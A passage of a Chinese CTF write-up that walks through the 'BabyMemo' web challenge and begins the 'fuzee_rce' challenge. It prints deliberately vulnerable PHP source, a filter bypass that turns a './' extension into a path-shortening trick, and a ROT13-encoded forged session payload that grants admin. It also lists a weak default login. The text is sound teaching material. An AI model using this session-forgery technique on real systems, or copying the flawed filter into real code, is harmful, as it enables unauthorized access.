class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br></code></pre></td></tr></table></figure><h1 id="web-BabyMemo"><a href="#web-BabyMemo" class="headerlink" title="web-BabyMemo"></a>web-BabyMemo</h1><h2 id="Break-2"><a href="#Break-2" class="headerlink" title="Break"></a>Break</h2><p>扫目录下载<code>www.zip</code></p><p>index.php部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>] = [];<br>        &#125;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;window.location.href=&quot;memo.php&quot;;&lt;/script&gt;&#x27;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;window.location.href=&quot;index.php?error=1&quot;;&lt;/script&gt;&#x27;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>memo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;memo&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;memo&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>][] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;memo&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;backup&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$backupMemos</span> = <span class="hljs-title function_ invoke__">implode</span>(PHP_EOL, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>]);<br><br>    <span class="hljs-variable">$random</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>));<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] . <span class="hljs-string">&#x27;_&#x27;</span> . <span class="hljs-variable">$random</span>;<br><br>    <span class="hljs-comment">// Handle compression method and file extension</span><br>    <span class="hljs-variable">$compressionMethod</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;compression&#x27;</span>] ?? <span class="hljs-string">&#x27;none&#x27;</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$compressionMethod</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;gzip&#x27;</span>:<br>            <span class="hljs-variable">$compressedData</span> = <span class="hljs-title function_ invoke__">gzencode</span>(<span class="hljs-variable">$backupMemos</span>);<br>            <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.gz&#x27;</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;application/gzip&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;bzip2&#x27;</span>:<br>            <span class="hljs-variable">$compressedData</span> = <span class="hljs-title function_ invoke__">bzcompress</span>(<span class="hljs-variable">$backupMemos</span>);<br>            <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.bz2&#x27;</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;application/x-bzip2&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;zip&#x27;</span>:<br>            <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br>            <span class="hljs-variable">$zipFilename</span> = <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;.zip&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$zipFilename</span>, <span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>) === <span class="hljs-literal">true</span>) &#123;<br>                <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$backupMemos</span>);<br>                <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>            &#125;<br>            <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$zipFilename</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;application/zip&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;none&#x27;</span>:<br>            <span class="hljs-variable">$compressedData</span> = <span class="hljs-variable">$backupMemos</span>;<br>            <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;text/plain&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-comment">// I don&#x27;t know what extension this is, but I&#x27;ll still give you the file. Don&#x27;t play any tricks, okay~</span><br>            <span class="hljs-variable">$compressedData</span> = <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$backupMemos</span>);<br>            <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$compressionMethod</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;text/plain&#x27;</span>;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$filename</span>);<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$compressedData</span>);<br>    <span class="hljs-comment">// Send headers and output file content</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Description: File Transfer&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: &#x27;</span> . <span class="hljs-variable">$mimeType</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>));<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br><br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;Memo&lt;/title&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            background-color: beige;<br>            font-family: Arial, sans-serif;<br>        &#125;<br><br>        h1,<br>        h2 &#123;<br>            color: darkslategray;<br>            margin-top: <span class="hljs-number">30</span>px;<br>            margin-bottom: <span class="hljs-number">10</span>px;<br>        &#125;<br><br>        form &#123;<br>            margin: <span class="hljs-number">30</span>px auto;<br>            width: <span class="hljs-number">80</span>%;<br>            padding: <span class="hljs-number">20</span>px;<br>            background-color: white;<br>            border-radius: <span class="hljs-number">10</span>px;<br>            box-shadow: <span class="hljs-number">0</span>px <span class="hljs-number">0</span>px <span class="hljs-number">10</span>px <span class="hljs-number">2</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.3</span>);<br>        &#125;<br><br>        label &#123;<br>            display: block;<br>            margin-bottom: <span class="hljs-number">10</span>px;<br>        &#125;<br><br>        input[type=<span class="hljs-string">&quot;text&quot;</span>],<br>        select &#123;<br>            width: <span class="hljs-number">100</span>%;<br>            padding: <span class="hljs-number">10</span>px;<br>            border-radius: <span class="hljs-number">5</span>px;<br>            border: none;<br>            margin-bottom: <span class="hljs-number">20</span>px;<br>        &#125;<br><br>        button[type=<span class="hljs-string">&quot;submit&quot;</span>] &#123;<br>            background-color: darkslategray;<br>            color: white;<br>            border: none;<br>            padding: <span class="hljs-number">10</span>px <span class="hljs-number">20</span>px;<br>            border-radius: <span class="hljs-number">5</span>px;<br>            cursor: pointer;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>    &lt;h1&gt;Welcome, <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]); <span class="hljs-meta">?&gt;</span>&lt;/h1&gt;<br>    &lt;form action=<span class="hljs-string">&quot;memo.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;memo&quot;</span>&gt;New Memo:&lt;/label&gt;<br>        &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;memo&quot;</span> id=<span class="hljs-string">&quot;memo&quot;</span> required&gt;<br>        &lt;button type=<span class="hljs-string">&quot;submit&quot;</span>&gt;Add Memo&lt;/button&gt;<br>    &lt;/form&gt;<br>    &lt;h2&gt;Here <span class="hljs-number">1</span>s Your Memos:&lt;/h2&gt;<br>    &lt;ul&gt;<br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$memo</span>) : <span class="hljs-meta">?&gt;</span><br>            &lt;li&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$memo</span>); <span class="hljs-meta">?&gt;</span>&lt;/li&gt;<br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endforeach</span>; <span class="hljs-meta">?&gt;</span><br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>) : <span class="hljs-meta">?&gt;</span><br>            &lt;li&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>); <span class="hljs-meta">?&gt;</span>&lt;/li&gt; &lt;!-- Only admin can get flag --&gt;<br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span> <span class="hljs-meta">?&gt;</span><br>    &lt;/ul&gt;<br>    &lt;form action=<span class="hljs-string">&quot;memo.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;compression&quot;</span>&gt;Compression method:&lt;/label&gt;<br>        &lt;select name=<span class="hljs-string">&quot;compression&quot;</span> id=<span class="hljs-string">&quot;compression&quot;</span>&gt;<br>            &lt;option value=<span class="hljs-string">&quot;none&quot;</span>&gt;None&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;gzip&quot;</span>&gt;GZIP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;bzip2&quot;</span>&gt;BZIP2&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;zip&quot;</span>&gt;ZIP&lt;/option&gt;<br>        &lt;/select&gt;<br>        &lt;button type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;backup&quot;</span> value=<span class="hljs-string">&quot;1&quot;</span>&gt;Export Backup&lt;/button&gt;<br>    &lt;/form&gt;<br>&lt;/body&gt;<br><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>1：首先很明显，当<code>$_SESSION[&#39;admin&#39;] === true</code>时就给flag，所以我们需要伪造session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>) : <span class="hljs-meta">?&gt;</span><br>            &lt;li&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>); <span class="hljs-meta">?&gt;</span>&lt;/li&gt; &lt;!-- Only admin can get flag --&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2：网页有个下载功能点，可以自定义后缀</p><p>但是过滤了<code>../</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">default</span>:<br>    <span class="hljs-comment">// I don&#x27;t know what extension this is, but I&#x27;ll still give you the file. Don&#x27;t plaany tricks, okay~</span><br>    <span class="hljs-variable">$compressedData</span> = <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$backupMemos</span>);<br>    <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$compressionMethod</span>;<br>    <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;text/plain&#x27;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$filename</span>);<br>    &#125;<br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>3：接着<code>file_put_contents</code>写到<code>/tmp</code>目录下，格式为<code>用户名_随机数.文件后缀</code>，其中用户名和文件后缀是可控的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$random</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>));<br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] . <span class="hljs-string">&#x27;_&#x27;</span> . <span class="hljs-variable">$random</span>;<br><span class="hljs-variable">$compressionMethod</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;compression&#x27;</span>] ?? <span class="hljs-string">&#x27;none&#x27;</span>;<br><span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$compressionMethod</span>;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$compressedData</span>);<br><span class="hljs-comment">// Send headers and output file content</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Description: File Transfer&#x27;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: &#x27;</span> . <span class="hljs-variable">$mimeType</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>));<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filename</span>);<br></code></pre></td></tr></table></figure><p>根据第二点和第三点可以得知，当传<code>compression</code>值为<code>./</code>时，与前面的<code>.</code>组合变成<code>../</code>，然后被替换成空，就可以修改文件格式为<code>用户名_随机数</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-BabyMemo-1.png"></p><p>而在php中，session文件默认位置是<code>/tmp/sess_PHPSESSID</code>，那么我们就可以把伪造的内容写入文件，然后设置<code>PHPSESSID</code>去访问</p><p>本题用的解析引擎是默认的<code>php</code>，格式为<code>键名 + 竖线 + 经过serialize()函数序列化处理的值</code>，例如<code>username|s:1:&quot;q&quot;;memos|a:1:&#123;i:0;s:1:&quot;a&quot;;&#125;</code></p><p>我们可以伪造一个<code>admin|b:1;username|s:5:&quot;admin&quot;;</code>，注意代码中还有一层<code>str_rot13</code>，变成<code>nqzva|o:1;hfreanzr|f:5:&quot;nqzva&quot;;</code></p><p>然后用<code>sess</code>登录后写入进memos</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-BabyMemo-2.png"></p><p>设置后缀为<code>./</code>，写入到<code>sess_46364caa4533f999</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-BabyMemo-3.png"></p><p>设置<code>PHPSESSID</code>为<code>46364caa4533f999</code>访问拿到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-BabyMemo-4.png"></p><h2 id="Fix-2"><a href="#Fix-2" class="headerlink" title="Fix"></a>Fix</h2><p>我的修法应该是非预期了</p><p>直接修改读flag的命令就过了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>) : <span class="hljs-meta">?&gt;</span><br>            &lt;li&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat flag&quot;</span>); <span class="hljs-meta">?&gt;</span>&lt;/li&gt; &lt;!-- Only admin can get flag --&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>正常可以设置一个判断，使用户不能等于<code>sess</code>或者在后缀处加个白名单等等</p><h1 id="web-fuzee-rce"><a href="#web-fuzee-rce" class="headerlink" title="web-fuzee_rce"></a>web-fuzee_rce</h1><h2 id="Break-3"><a href="#Break-3" class="headerlink" title="Break"></a>Break</h2><p>弱口令<code>admin/admin123</code>直接登录后跳转到<code>goods.php</code>，然后就是一片空白，当时比赛时尝试了几个常见的参数，都没试出来就放弃了，在Fix阶段看到源码后没想到参数是<code>w1key</code></p><p>传参后拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> (<span class="hljs-string">&quot;check.php&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$w1key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$w1key</span>) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$w1key</span>) == <span class="hljs-variable">$w1key</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$w1key</span>) &lt;= <span class="hljs-number">3</span> &amp;&amp; <span class="hljs-variable">$w1key</span> &gt; <span class="hljs-number">999999999</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Please input a valid number!&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$w1key</span> = <span 